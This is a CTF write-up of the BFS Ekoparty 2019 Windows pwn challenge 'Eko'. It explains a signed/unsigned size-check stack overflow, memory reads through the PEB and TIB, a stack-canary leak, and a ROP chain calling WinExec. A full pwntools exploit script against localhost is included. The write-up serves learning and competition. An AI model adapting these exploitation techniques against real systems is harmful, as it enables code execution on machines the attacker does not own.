@@ -1,0 +1,309 @@
+#+TITLE: BFS CTF 2019 - Eko (windows/pwn)
+#+author: Daniel Brodsky
+#+date: 2019-10-12
+#+hugo_base_dir: ../../
+#+hugo_section: writeups
+#+startup: inlineimages
+#+hugo_menu: :menu "foo" :weight 10 :parent main :identifier single-toml
+#+description: windows pwn that isn't just reversing a bunch of obfuscated .NET assembly or a VB script or some shit
+
+** Problem
+This problem had no initial description. It was given to me with the offer of getting a ~calc.exe~ sticker if I managed to pop calc.
+(TODO link to binary)
+
+** Analysis
+The binary provided I need to pwn is a PE32+ Windows executable. Running the binary prints the following:
+    
+~Ekoparty 2019 - BFS challenge~
+~Server listening~
+~Waiting for client connections~
+
+and then hangs. Using the references to these strings in memory finds us the function that's the most likely entry for our program's logic.
+Most symbols for functions were available after loading a MS symbol server into IDA. Some reversing still needed to be done on local variables to understand their purpose.
+
+This is the code after some cleanup.
+
+(TODO picture of reversed function)
+
+Looking at the decompiled code for this function in IDA, we see that it opens a socket on port 54321, and waits for a connection. Upon receiving a connection, it passes the established connection to another function for further processing. The function ~handleMessage~ first checks the first 16 bytes received from the new connection, expecting the first 8 bytes to be the cookie ~Eko2019\0~, followed by an 8 byte value representing the size of the following write. Adding this header struct to IDA cleaned up the decompiled code a bit.
+
+(TODO pic of header here)
+
+This is the important part of the ~handleMessage~ function after some cleanup.
+
+(TODO pic of check_header here)
+
+Aside from the header check, a couple things stand out immediately. The first is that the size check in the header uses a signed value when checking its upper bound, but an unsigned value when using it to read additional input from the connection. This means that it's possible to write more data than the size of the ~Dst~ buffer, resulting in a stack overflow. However, attempting to use this stack overflow to get code execution directly is no good, as there is a stack canary located just below the header struct in the stack (an IDA decompiler bug hid the canary logic in the decompiled code).
+
+(TODO pic of canary logic)
+
+The other significant logic in the decompiled code that stands out are the calls to ~GetCurrentProcess~ and ~WriteProcessMemory~. ~GetCurrentProcess~ just takes the current process and returns a process handle.
+
+~WriteProcessMemory~ is more interesting. This is the function signature of WriteProcessMemory, taken from Microsoft's Win32 docs (TODO link here):
+
+#+begin_src C++
+BOOL WriteProcessMemory(
+  HANDLE  hProcess,
+  LPVOID  lpBaseAddress,
+  LPCVOID lpBuffer,
+  SIZE_T  nSize,
+  SIZE_T  *lpNumberOfBytesWritten
+);
+#+end_src
+
+This function takes ~nSize~ bytes of memory from the location ~lpBuffer~ and writes into to ~lpBaseAddress~ inside of ~hProcess~. In this program's case, it's going to write 8 bytes from a buffer created by the function call to ~reverse_str~ with the args set to ~dst_loc[v8=0x3E]~. The value is going to be written into memory and executed as a function with ~v9~ as its argument, and the result will be sent to us by the call to ~send~. The address of the value we're sent comes from ~dst_loc~, which was set to a series of values in ~main~.
+
+#+begin_src C
+// this sets the possible values for the data that's written during WriteProcessMemory
+  for ( i = 0; i < 0x100; ++i )
+  {
+    argv = (const char **)dst_loc;
+    dst_loc[i] = ((unsigned __int64)i << 56) + 0x488B01C3C3C3C3i64; // 0xC3 are rets
+  } 
+
+#+end_src
+
+** Vulnerability
+
+Earlier I mentioned that the stack overflow we get from abusing the signed comparison and unsigned use of the size we pass in couldn't be used to get code execution, since there is a stack canary. However, we can still use this stack overflow to overwrite anything between the ~Dst~ buffer and the end of the stack for the current function.
+
+#+begin_src C
+  char *Dst; // [rsp+60h] [rbp-238h]
+  int v8; // [rsp+260h] [rbp-38h]
+  __int64 *v9; // [rsp+268h] [rbp-30h]
+  eko_s buf; // [rsp+270h] [rbp-28h]
+  SOCKET s; // [rsp+2A0h] [rbp+8h]
+#+end_src
+
+In particular we see here that ~v8~ and ~v9~ can be overwritten when ~Dst~ is overflown. ~v8~ is the variable used to index into ~dst_loc~ to obtain the address whose value we're going to be sent, and ~v9~ is the argument passed to the function selected by ~v8~. We can overwrite ~v8~ and have it set to any index of ~dst_loc~ we want, and we can override ~v9~ to get any argument value for the function we select from ~v8~.
+
+Using a small script we can generate all values contained inside of ~dst_loc~ to see if there are any useful values to use as shellcode (we could also have read them from memory after being generated but this was about just as easy).
+
+#+begin_src python
+from pwn import *
+start = 0x488B01C3C3C3C3
+
+context.arch='amd64'
+p64b = make_packer(64, endian='big', sign='unsigned')
+
+instr = []
+for i in range(256):
+    print disasm(p64b(( i << 56 ) + start))
+#+end_src
+
+Of the values generated by this script, 2 of them are useful for our needs.
+
+#+begin_src asm
+Index 0x65
+   0:   65 48 8b 01             mov    rax,QWORD PTR gs:[rcx] // returns the value at gs:v9
+   4:   c3                      ret    
+   5:   c3                      ret    
+   6:   c3                      ret    
+   7:   c3                      ret
+#+end_src
+
+#+begin_src asm
+Index 0x66
+   0:   66 48 8b 01             data16 mov rax,QWORD PTR [rcx] // returns *v9
+   4:   c3                      ret    
+   5:   c3                      ret    
+   6:   c3                      ret    
+   7:   c3                      ret
+#+end_src
+
+Why are these 2 snippets of shellcode useful? In the case of index 0x66 it gives us the ability to read any 8 bytes from program memory that we know the address to. For index 0x65 we need to know more about Windows internals.
+
+On AMD64 (Linux) based systems, the segment register gs is used to obtain CPU-related information for the process during runtime. However, for Windows systems the gs register is used to store the Thread Information Block (TIB) (TODO link here). This block contains a lot of useful information the thread may need to lookup when switching in and out of context. One particularly useful item the TIB stores at index 0x60 is the Process Environment Block (PEB) (TODO link here), which stores the lowest-level information needed in userspace and the highest level information needed in kernelspace. From here at offset 0x18 we can find the address to the ldr (https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data), a data structure used to store pointers to all loaded modules available in the process' space. It stores this information in the form of a linked list known as the InMemoryOrderModuleList (IMOML), whose head can be accessed at offset 0x20. The structure of an entry in this list is as follows:
+#+begin_src C
+typedef struct _LDR_DATA_TABLE_ENTRY {
+    PVOID Reserved1[2];
+    LIST_ENTRY InMemoryOrderLinks; // ptr to struct that holds linked list pointers
+    PVOID Reserved2[2];
+    PVOID DllBase;                 // base address of the loaded module
+    PVOID EntryPoint;
+    PVOID Reserved3;
+    UNICODE_STRING FullDllName;
+    BYTE Reserved4[8];
+    PVOID Reserved5[3];
+    union {
+        ULONG CheckSum;
+        PVOID Reserved6;
+    };
+    ULONG TimeDateStamp;
+} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
+#+end_src
+
+The first DLL that's loaded into our process is our binary, so reading offset 0x20 (we start at the list entry and move 0x20 down from there) will get us the base address of our binary. With that, we now have all the tools we need to start forming an exploit.
+
+
+** Exploit
+
+While the vulnerability above is pretty useful, there's still a lot of work to be done if we want to pop calc on this program. We still need to get the following things:
+- a canary leak so we can form a ropchain
+- an address to WinExec or a similar function that lets us execute arbitrary PEs
+- a ropchain to put our exploit together
+
+*** Canary leak
+
+How a canary is stored for a binary on Windows is different from Linux. On Linux the canary is stored at fs:0x28, which is where glibc places the stack guard value each time the process is run (TODO https://stackoverflow.com/questions/10325713/why-does-this-memory-address-fs0x28-fs0x28-have-a-random-value ). On Windows the stack canary location is hardcoded into the binary at a set offset, which we can easily find by looking at the binary we have. In this binary, the canary is offset ~0xC240~ from the starting address. From what we saw in the previous section, we know the base address of our binary and we can therefore use the same vulnerability as before to get the canary value ~baseDLL+0xC240~. 
+
+Unfortunately, this isn't the actual canary value we're looking for. If you look back to the assembly code used to set the canary value at the top of the function ~handleMessage~ you'll notice that the canary is xor'd by rsp. In order to get the true canary value, we'll need to leak the value of rsp at the time of our function. To do this we can read from ~gs:0x8~, which corresponds to the ~stackBase~ in the TIB and gives us the base of the stack in our process. While we could attempt to compute the exact offset from the stack base that our rsp should be at, I opted to instead brute force the value by reading upwards on the stack until I reached a value I was sure I knew the location of relative to rsp. After that, I read upwards the necessary offset on the stack to get rsp and xor'd it with the canary leak to get the true canary.
+
+#+begin_src python
+curr_addr = stack_base
+while True:
+    curr_addr -= 0x8
+    print 'curr addr: ' + str(curr_addr)
+    curr_val = u64(send(p64(0x66) + p64(curr_addr)))
+    print 'curr val: ' + str(curr_val)
+    if curr_val == known_val:
+        break
+curr_addr -= known_to_rsp_offset # comparing to stack value 0x8 lower than stack top
+print 'stack top addr: ' + str(curr_addr)
+
+# xor original canary with rsp value for true canary
+true_canary = canary_addr ^ curr_addr
+print 'true canary: ' + str(hex(true_canary))
+#+end_src
+
+*** WinExec Address
+Using the IMOML address we obtained earlier, we can read further into the linked list to obtain list entries to other DLLs that were loaded into the process. Since we want ~WinExec~ so that we can run ~calc.exe~, we'll need to read through the IMOML until we get to the ~kernel32.dll~. ~WinExec~ is always loaded to the same offset from the kernel32 base address so we just need to get the base address and we're good. After leaving the entry for the process dll, we'll end up at the ntdll module. Going one step further brings us to the kernel32 module's entry where we can get the base address like we did before.
+
+*** Ropchain
+Now that we have our function to pop ~calc.exe~ and the true stack canary, we can form a ROP chain to get what we came for. I'm not going to go into too much detail about how I made this ropchain, but I used ropper to get all possible gadgets and then found the ones that were useful for setting up a call to ~WinExec~. I reused the buffer provided to store the path to ~calc.exe~ and the same technique I used earlier to get the stack canary to get the address of the buffer so I could pass it as an argument to ~WinExec~. You can see my full exploit below.
+
+#+begin_src python
+
+from pwn import *
+from ctypes import *
+
+class header_s(Structure):
+    _fields_ = [
+            ("cookie", c_char * 8),
+            ("size", c_int64)
+            ]
+
+def to_str(struct):
+    return string_at(addressof(struct), sizeof(struct))
+
+def send(arg):
+    p = remote('localhost', 54321)
+    header = header_s("Eko2019", -448)
+    p.sendline(to_str(header))
+    p.sendline('A'*0x1ff + arg + 'AAAAAAA')
+    return p.recv()
+
+canary_offset = 0xC240 # canary offset in memory is hardcoded for windows
+known_addr_offset = 0x1000 # known addr location is baseDLL + this offset
+
+
+# loop 1 - get address of PEB using gs:0x60
+get_peb = p64(0x65) + p64(0x60)
+peb_addr = u64(send( get_peb ))
+print 'peb: ' + str(peb_addr)
+# loop 2 - get ldr address using cs:<PEB+0x18>
+get_ldr = p64(0x66) + p64(peb_addr + 0x18)
+ldr_addr = u64(send( get_ldr ))
+print 'ldr: ' + str(ldr_addr)
+# loop 3 - get InMemoryOrderModuleList adress using cs:<ldr+0x20> (ekoEntry)
+get_imoml = p64(0x66) + p64(ldr_addr + 0x20)
+imoml_addr = u64(send( get_imoml ))
+print 'imoml: ' + str(imoml_addr)
+# loop 4 - get DLL base address using cs:<InMemoryOrderModuleList+0x30>
+# (offset by 0x10 from where pointer located in linked list so 0x20)
+get_dll = p64(0x66) + p64(imoml_addr + 0x20)
+dll_addr = u64(send( get_dll ))
+print 'dll: ' + str(dll_addr)
+# loop 5 - leak original stack canary with cs:<base+canary_offset>
+get_canary = p64(0x66) + p64(dll_addr + canary_offset)
+canary_addr = u64(send( get_canary ))
+print 'canary: ' + str(canary_addr)
+# loop 6 - get stackBase from TIB
+get_stackBase = p64(0x65) + p64(0x8)
+stack_base = u64(send( get_stackBase ))
+print 'stack base: ' + str(stack_base)
+# loop 6.5 - loop until we get stack top (== to known_offset + known_to_rsp_offset)
+# using some string address that only gets used once here
+known_val = dll_addr + known_addr_offset
+known_to_rsp_offset = 0x8
+print 'known val: ' + str(known_val)
+
+curr_addr = stack_base
+while True:
+    curr_addr -= 0x8
+    print 'curr addr: ' + str(curr_addr)
+    curr_val = u64(send(p64(0x66) + p64(curr_addr)))
+    print 'curr val: ' + str(curr_val)
+    if curr_val == known_val:
+        break
+curr_addr -= known_to_rsp_offset # comparing to stack value 0x8 lower than stack top
+print 'stack top addr: ' + str(curr_addr)
+
+# xor original canary with rsp value for true canary
+true_canary = canary_addr ^ curr_addr
+print 'true canary: ' + str(hex(true_canary))
+# loop 7 - get ntdll block address using cs:<ekoEntry+0x10>)
+# (offset by 0x10 from where pointer located in linked list so no offset)
+get_ntdll = p64(0x66) + p64(imoml_addr)
+ntdll_addr = u64(send( get_ntdll ))
+print 'ntdll: ' + str(ntdll_addr)
+# loop 8 - get kernel32 block address using cs:<ntdll+0x10>
+get_kernel = p64(0x66) + p64(ntdll_addr)
+kernel_addr = u64(send( get_kernel ))
+print 'kernel: ' + str(kernel_addr)
+# loop 9 - get kernel32 base address using cs:<kernel+0x30>
+get_kernel_base = p64(0x66) + p64(kernel_addr + 0x20)
+kernel_base = u64(send( get_kernel_base ))
+print 'kernel_base: ' + str(kernel_base)
+# compute address of WinExec in kernel32.dll
+# can also do LoadLibraryA on smb share UNC name to run custom DLL
+WinExec_offset = 0x5e800
+winexec_addr = kernel_base + WinExec_offset
+
+# location where we write the path name arg for WinExec
+dst_stack = curr_addr + 0x68
+
+# ROPchain from ropper to write our path name from dst into rcx (windows arg1 register) and call WinExec
+# pop rax; ret;
+pop_rax = dll_addr + 0x1167
+# pop rbx; ret;
+pop_rbx = dll_addr + 0x16f9
+# mov rcx, rbx; call rax
+mov_rcx_rbx_call_rax = dll_addr + 0x6081
+
+# loop 10 - ROP chain to call LoadLibrary with calc.exe DLL
+p = remote('localhost', 54321)
+header = header_s("Eko2019", -448)
+p.sendline(to_str(header))
+p.sendline('A'*7 + 'C:\\Windows\\System32\\calc.exe\x00'.ljust(0x1f8,'A') + p64(0x66) + p64(kernel_addr + 0x20) +
+        'A'*0x10 + p64(true_canary) + 'A'*0x10 +
+        p64(pop_rax) +
+        p64(winexec_addr) +
+        p64(pop_rbx) +
+        p64(dst_stack) +
+        p64(mov_rcx_rbx_call_rax) +
+        'A'*7)
+
+# pop :)
+pause()
+
+#+end_src
+
+Finally, the full exploit has been assembled and we can get that sweet, sweet ~calc~.
+
+(TODO picture of exploit being run)
+(TODO picture of exploit being run and calc.exe open)
+
+
+
+** Opinion
+I'm not much of a fan of Windows, but pwning it was pretty cool. This problem was what I wish more CTF problem writers would use as inspiration when writing Windows problems, as most of the time it's some boring and unfun .NET or VB reversing problem. Working on a Windows problem instead of a Linux problem also meant I came away with significantly more new knowledge, since this was a domain I rarely see or work on during CTFs.
+
+Note: I left out in this writeup the hours I spent trying to understand the Windows internals structure from within Windbg because, in reflection, I've realized that much of this problem could have been done completely statically. There's always a fine balance that needs to be found between spending time looking for information and paths to approach a problem, and it's one of the skills I still need to work on when it comes to CTFs and also my career.
+
+** References
+ - https://www.geoffchappell.com/studies/windows/win32/ntdll/structs/peb/index.htm (in-depth windows internals information)
+ - https://en.wikipedia.org/wiki/Win32_Thread_Information_Block (struct layout for TIB)
+ - https://reverseengineering.stackexchange.com/questions/16336/where-es-gs-fs-are-pointing-to (history on segment registers)
+ - https://en.wikipedia.org/wiki/Process_Environment_Block (struct layout PEB)
+ - https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode#initialized-structures (getting WinExec)
